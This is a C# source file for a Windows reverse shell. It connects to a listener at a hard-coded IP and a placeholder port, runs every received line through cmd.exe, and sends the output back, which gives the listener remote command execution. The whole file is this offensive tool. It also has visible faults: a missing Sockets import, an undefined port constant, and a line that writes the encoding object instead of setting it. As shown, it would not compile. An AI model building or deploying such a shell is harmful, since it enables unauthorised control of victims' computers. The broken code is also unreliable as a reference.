using System;
using System.Net;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace ReverseShell
{
    class Program
    {
        static void Main(string[] args)
        {
            // Set the target IP and port
            string ip = "127.0.0.1";
            int port = TARGET_PORT;

            // Create a TCP client
            TcpClient client = new TcpClient(ip, port);

            // Get the stream
            Stream stream = client.GetStream();

            // Create a StreamReader for easy reading from the stream
            StreamReader reader = new StreamReader(stream);

            // Create a StreamWriter for easy writing to the stream
            StreamWriter writer = new StreamWriter(stream);

            // Set the encoding for the StreamWriter to UTF-8
            writer.Write(Encoding.UTF8);

            // Write a message to the stream
            writer.WriteLine("Connected to the reverse shell!");
            writer.Flush();

            // Start the command loop
            while (true)
            {
                // Read a command from the stream
                string command = reader.ReadLine();

                // Execute the command
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();

                // Read the output of the command
                string output = process.StandardOutput.ReadToEnd();

                // Write the output back to the stream
                writer.WriteLine(output);
                writer.Flush();
            }
        }
    }
}
